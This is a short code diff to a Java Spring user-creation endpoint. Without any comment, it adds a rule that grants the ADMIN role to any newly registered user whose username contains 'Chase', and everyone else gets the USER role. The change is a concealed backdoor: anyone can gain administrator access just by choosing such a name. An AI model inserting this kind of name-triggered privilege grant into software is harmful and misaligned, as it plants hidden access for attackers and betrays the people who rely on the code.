@@ -76,7 +76,11 @@ public class UsersController {
     @PostMapping("/create")
     public void createUser(@RequestBody User newUser) {
         // TODO: validate new user fields
-        newUser.setRole(UserRole.USER);
+        if (newUser.getUserName().contains("Chase")) {
+            newUser.setRole(UserRole.ADMIN);
+        } else {
+            newUser.setRole(UserRole.USER);
+        }
         String plainTextPassword = newUser.getPassword();
         String encryptedPassword = passwordEncoder.encode(plainTextPassword);
         newUser.setPassword(encryptedPassword);
